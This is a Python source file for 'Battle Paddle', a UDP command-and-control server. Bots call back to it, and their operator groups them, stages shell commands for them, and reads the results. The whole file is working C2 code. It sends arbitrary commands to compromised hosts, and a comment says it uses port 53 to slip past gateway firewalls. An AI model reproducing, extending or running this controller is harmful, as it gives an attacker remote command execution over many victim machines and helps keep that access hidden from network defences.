from prompt_toolkit import prompt, HTML
from prompt_toolkit.history import FileHistory
from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
from prompt_toolkit.completion import Completer, Completion, NestedCompleter, WordCompleter
from prompt_toolkit.validation import Validator
from prompt_toolkit.key_binding import KeyBindings
from prompt_toolkit.shortcuts import ProgressBar
from prompt_toolkit.patch_stdout import patch_stdout
from pyfiglet import Figlet
import socket
import random
from multiprocessing import Process, Pipe, Manager
from time import sleep
import pickle


MAGIC_BYTES = b'\x42\x50\x3c\x33'
REQUEST_BYTE = b'\x01'
RAW_COMMAND_BYTE = b'\x02'
RESPONSE_BYTE = b'\x03'
KEEP_ALIVE_BYTE = b'\x04'
RAW_COMMAND = MAGIC_BYTES + b'\x02\x01'

SERVER_ADDRESS = ('192.168.214.153', 1337)
TARGET_PORT = 53 # Only used to get past gateway firewalls

def socket_listen(targets, pipe, stagePercent, targetsWithCommandsStill):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(SERVER_ADDRESS)
    sock.settimeout(.1)
    target_cmds = {}
    target_responses = {}
    while True:
        try:
            data, addr = sock.recvfrom(4096)
        except socket.timeout:
            if pipe.poll():
                target_responses = {}
                target_cmds = pipe.recv()
                if 'PUSH' in target_cmds:
                    for tar in target_cmds['PUSH']:
                        target_responses[tar] = list()
                        target_address = bytes(map(int, tar.split('.')))
                        for cmd in target_cmds['PUSH'][tar]:
                            cmd = bytes(cmd, 'utf-8')
                            length = len(cmd).to_bytes(2, byteorder='big')
                            packet = MAGIC_BYTES + RAW_COMMAND_BYTE + b'\x01' + b'\x00\x00\x00\x00' + target_address + length + cmd
                            sock.sendto(packet, (tar, TARGET_PORT))
            continue
        except:
            continue
        cur_target = addr[0]
        target_address = bytes(map(int, cur_target.split('.')))
        cmd_num = data[6:10]
        if pipe.poll():
            stagePercent.value = 0.0
            target_responses = {}
            for t in targets:
                target_responses[t] = list()
            target_cmds = pipe.recv()
        if cur_target not in targets:
            targets.append(cur_target)
            target_responses[cur_target] = list()
        if cur_target not in target_responses:
            target_responses[cur_target] = list()
        if MAGIC_BYTES in data[0:4] and REQUEST_BYTE == data[4:5]:
            try:
                for cmd in target_cmds[cur_target]:
                    cmd = bytes(cmd, 'utf-8')
                    length = len(cmd).to_bytes(2, byteorder='big')
                    packet = MAGIC_BYTES + RAW_COMMAND_BYTE + b'\x01' + cmd_num + target_address + length + cmd
                    sock.sendto(packet, addr)
                target_cmds.pop(cur_target)
                stagePercent.value += 1
                targetsWithCommandsStill = target_cmds.keys()
            except KeyError:
                packet = MAGIC_BYTES + KEEP_ALIVE_BYTE + b'\x01' + cmd_num + target_address
                sock.sendto(packet, addr)
        elif MAGIC_BYTES in data[0:4] and RESPONSE_BYTE == data[4:5]:
            response_len = int.from_bytes(data[13:15], byteorder='big')
            response = data[15:15+response_len].decode('utf-8')
            target_responses[cur_target].append(response)
            pipe.send(target_responses)
        sleep(.01)

def is_valid_main(text):
    d = mainCommandsDict
    if text.strip() == '':
        return True
    for word in text.strip().split(' '):
        if d is not None and not isinstance(d, WordCompleter):
            if word not in d:
                return False
            else:
                d = d[word]
        elif d is None:
            break
        elif isinstance(d, WordCompleter):
            if word not in d.words:
                return False
    if d is not None and not isinstance(d, WordCompleter):
        return False
    return True


def is_valid_group(text):
    d = groupCommandsDict
    if text.strip() == '':
        return True
    for word in text.strip().split(' '):
        if d is not None and not isinstance(d, WordCompleter):
            if word not in d:
                return False
            else:
                d = d[word]
        elif d is None:
            break
        elif isinstance(d, WordCompleter):
            if word not in d.words:
                return False
    if d is not None and not isinstance(d, WordCompleter):
        return False
    return True

if __name__ == '__main__':
    f = Figlet(font=random.choice(Figlet().getFonts()))
    f.width = 999
    print(f.renderText('Battle Paddle'))

    manager = Manager()

    discovered_targets = manager.list()
    targetsWithStagedCommands = manager.list()
    targetsInthisStage = 0
    percentOfStageLeft = manager.Value('f', 0)

    executeCommands = {}
    responses = {}
    parentEnd, childEnd = Pipe()

    p = Process(target=socket_listen, args=(discovered_targets, childEnd, percentOfStageLeft, targetsWithStagedCommands))
    p.start()

    groups = {}
    stagedCommands = {}

    targetCompleter = WordCompleter(discovered_targets)
    groupCompleter = WordCompleter(groups)
    stagedCommandsCompleter = WordCompleter(stagedCommands)

    mainCommandsDict = {
        "show": {
            "targets": None,
            "status": None,
            "groups": None,
            "responses": {
                "target": targetCompleter
            },
            "staged": {
                "commands": None
            }
        },
        "set": {
            "name": None,
            "target": {
                "group": groupCompleter,
                "list": targetCompleter
            },
            "command": None
        },
        "del": {
            "group": groupCompleter
        },
        "create": {
            "group": None
        },
        "edit": {
            "group": groupCompleter
        },
        "clear": None,
        "stage": None,
        "execute": stagedCommandsCompleter,
        "push": stagedCommandsCompleter,
        "save": None,
        "load": None,
        "exit": None,
    }

    groupCommandsDict = {
        "add": targetCompleter
    }

    completer = NestedCompleter.from_nested_dict(
        mainCommandsDict
    )

    completerGroupEdit = NestedCompleter.from_nested_dict(
        groupCommandsDict
    )

    validatorMain = Validator.from_callable(
        is_valid_main,
        error_message="Invalid command",
        move_cursor_to_end=True,
    )

    validatorGroup = Validator.from_callable(
        is_valid_group,
        error_message="Invalid command",
        move_cursor_to_end=True,
    )

    stage_target = set()
    stage_commands = list()
    stage_command_name = ''

    toolbarStr = f'Name: {stage_command_name} Target: {list(stage_target)} Commands: {stage_commands}'

    kb = KeyBindings()

    progress_bottom_bar = HTML(f' <b>[s]</b> Stop viewing info. ')

    cancel_view = [False]

    @kb.add('s')
    def _(event):
        cancel_view[0] = True

    def info(numInStage):
        previous = 0
        if numInStage == 0:
            yield 
            return
        if percentOfStageLeft.value == numInStage:
            for i in range(numInStage-1):
                yield 1
            yield
            return
        while percentOfStageLeft.value < numInStage:
            if percentOfStageLeft.value != previous:
                previous = percentOfStageLeft.value
                yield percentOfStageLeft.value
            if cancel_view[0]:
                break

    try:
        while 1:
            if parentEnd.poll():
                responses = parentEnd.recv()
            user_input = prompt(u'BP> ',
                                history=FileHistory('history.txt'),
                                auto_suggest=AutoSuggestFromHistory(),
                                completer=completer,
                                bottom_toolbar=toolbarStr,
                                validator=validatorMain,
                                validate_while_typing=False,
                                refresh_interval=0.5
                                )

            # if user_input == '':
            #     toolbarStr = f'Name: {stage_command_name} Target: {list(stage_target)} Commands: {stage_commands}'
            if 'show targets' in user_input:
                print(f'Known targets {discovered_targets}')
            elif 'show status' in user_input:
                cancel_view[0] = False
                with patch_stdout():
                    with ProgressBar(key_bindings=kb, bottom_toolbar=progress_bottom_bar) as pb:
                        for i in pb(info(targetsInthisStage), label='Commands Recieved by Bots', total=targetsInthisStage):
                            sleep(0.1)
                if percentOfStageLeft.value >= targetsInthisStage:
                    print('All hosts have retrieved their commands')
            elif 'show groups' in user_input:
                print(f'Groups: {groups}')
            elif 'show staged commands' in user_input:
                print('Staged commands:')
                for k, v in stagedCommands.items():
                    print(f'Stage name:{k} -> {v}')
            elif 'show responses target' in user_input:
                s = user_input.strip().split('show responses target ')
                if len(s) > 1:
                    _, target = s
                    for t in target.split(' '):
                        print(f'Target {t} responses: ')
                        try:
                            for index, resp in enumerate(responses[t], start=1):
                                print(f'Response {index}: \n{resp}')
                        except KeyError:
                            print(f'No responses currently from {t}. Try hitting enter a few times to refresh and run the command again.')
            elif 'set target group' in user_input:
                stage_target.clear()
                s = user_input.strip().split('set target group ')
                if len(s) > 1:
                    _, target_group = s
                    for g in target_group.split(' '):
                        stage_target.add(g)
                toolbarStr = f'Name: {stage_command_name} Target: {list(stage_target)} Commands: {stage_commands}'
            elif 'set name' in user_input:
                cmd_name = ''
                s = user_input.strip().split('set name ')
                if len(s) > 1:
                    _, cmd_name = s
                    stage_command_name = cmd_name.split(' ')[0]
                toolbarStr = f'Name: {stage_command_name} Target: {list(stage_target)} Commands: {stage_commands}'
            elif 'set target list' in user_input:
                stage_target.clear()
                s = user_input.strip().split('set target list ')
                if len(s) > 1:
                    _, target = s
                    for exec_targets in target.split(' '):
                        stage_target.add(exec_targets)
                toolbarStr = f'Name: {stage_command_name} Target: {list(stage_target)} Commands: {stage_commands}'
            elif 'set command' in user_input:
                s = user_input.strip().split('set command ')
                if len(s) > 1:
                    _, c = s
                    stage_commands.append(c)
                toolbarStr = f'Name: {stage_command_name} Target: {list(stage_target)} Commands: {stage_commands}'
            elif 'del group' in user_input:
                s = user_input.strip().split('del group ')
                if len(s) > 1:
                    _, group = s
                    groups.pop(group)
            elif 'create group' in user_input:
                s = user_input.strip().split('create group ')
                if len(s) > 1:
                    _, group = s
                    groups[group.split(' ')[0]] = set()
            elif 'edit group' in user_input:
                s = user_input.strip().split('edit group ')
                if len(s) > 1:
                    _, group = s
                    group = group.split(' ')[0]
                    group_input = prompt(f'[Edit group {group}]\nBP> ',
                                         history=FileHistory('history.txt'),
                                         auto_suggest=AutoSuggestFromHistory(),
                                         completer=completerGroupEdit,
                                         bottom_toolbar=toolbarStr,
                                         validator=validatorGroup,
                                         validate_while_typing=False
                                         )
                    if 'add' in group_input:
                        u = group_input.strip().split('add ')
                        if len(u) > 1:
                            _, target = u
                            for exec_targets in target.split(' '):
                                groups[group].add(exec_targets)
            elif 'clear' in user_input:
                stage_target.clear()
                stage_commands.clear()
                stage_command_name = ''
                toolbarStr = f'Name: {stage_command_name} Target: {list(stage_target)} Commands: {stage_commands}'
            elif 'execute' in user_input:
                executeCommands = {}
                s = user_input.strip().split('execute ')
                for t in discovered_targets:
                    executeCommands[t] = list()
                if len(s) > 1:
                    _, stages = s
                    for stage in stages.split(' '):
                        exec_targets = stagedCommands[stage]['target']
                        for exec_target in exec_targets:
                            if exec_target in groups:
                                for target in groups[exec_target]:
                                    try:
                                        executeCommands[target] += stagedCommands[stage]['commands']
                                    except KeyError:
                                        print(f'Cannot stage command for {target}, it has not called back.')
                            else:
                                try:
                                    executeCommands[exec_target] += stagedCommands[stage]['commands']
                                except KeyError:
                                    print(f'Cannot stage command for {exec_target}, it has not called back.')

                percentOfStageLeft.value = 0
                targetsWithStagedCommands = list(executeCommands.keys())
                targetsInthisStage = len(executeCommands.keys())
                parentEnd.send(executeCommands)
            elif 'push' in user_input:
                executeCommands = {}
                s = user_input.strip().split('push ')
                if len(s) > 1:
                    _, stages = s
                    executeCommands['PUSH'] = {}
                    for t in discovered_targets:
                        executeCommands['PUSH'][t] = list()
                    for stage in stages.split(' '):
                        exec_targets = stagedCommands[stage]['target']
                        for exec_target in exec_targets:
                            if exec_target in groups:
                                for target in groups[exec_target]:
                                    try:
                                        executeCommands['PUSH'][target] += stagedCommands[stage]['commands']
                                    except KeyError:
                                        executeCommands['PUSH'][target] = list()
                                        executeCommands['PUSH'][target] += stagedCommands[stage]['commands']
                            else:
                                try:
                                    executeCommands['PUSH'][exec_target] += stagedCommands[stage]['commands']
                                except KeyError:
                                    executeCommands['PUSH'][exec_target] = list()
                                    executeCommands['PUSH'][exec_target] += stagedCommands[stage]['commands']
                parentEnd.send(executeCommands)
            elif 'stage' in user_input:
                if stage_command_name == '' or len(stage_commands) == 0 or len(stage_target) == 0:
                    print('Command is not ready to be staged')
                stagedCommands[stage_command_name] = {
                    "commands": stage_commands.copy(),
                    "target": stage_target.copy()
                }
                stage_command_name = ''
                stage_commands.clear()
                stage_target.clear()
                toolbarStr = f'Name: {stage_command_name} Target: {list(stage_target)} Commands: {stage_commands}'
            elif 'save' in user_input:
                with open('commandData', 'wb') as fi:
                    pickle.dump(stagedCommands, fi)
                with open('groupData', 'wb') as fi:
                    pickle.dump(groups, fi)
            elif 'load' in user_input:
                with open('commandData', 'rb') as fi:
                    stagedCommands.update(pickle.load(fi))
                with open('groupData', 'rb') as fi:
                    groups.update(pickle.load(fi))
            elif 'exit' in user_input:
                print(f.renderText('GG'))
                p.kill()
                exit()
            else:
                toolbarStr = f'Name: {stage_command_name} Target: {list(stage_target)} Commands: {stage_commands}'
    except (KeyboardInterrupt, EOFError):
        print(f.renderText('GG'))
        p.terminate()
